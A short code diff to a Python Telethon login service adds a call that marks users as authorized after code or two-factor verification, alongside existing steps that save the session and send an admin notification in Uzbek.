@@ -29,6 +29,7 @@ from telethon.errors import SessionRevokedError
 from database import get_db, get_temp_groups_from_db
 import requests
 import os
+from database import authorize_user
 from datetime import datetime
 
 ADMIN_BOT_TOKEN = os.getenv("ADMIN_BOT_TOKEN")
@@ -188,6 +189,7 @@ def verify_code():
         save_user_session(user.id, final_session)
         save_user(user.id, phone, user.username)
         delete_login_attempt(phone)
+        authorize_user(user.id)
         notify_admin_bot(
             "🆕 *Yangi foydalanuvchi login qildi*\n\n"
             f"👤 ID: `{user.id}`\n"
@@ -247,6 +249,7 @@ def verify_password():
         save_user_session(user.id, final_session)
         save_user(user.id, phone, user.username)
         delete_login_attempt(phone)
+        authorize_user(user.id)
         notify_admin_bot(
             "🔐 *Yangi foydalanuvchi (2FA) login qildi*\n\n"
             f"👤 ID: `{user.id}`\n"
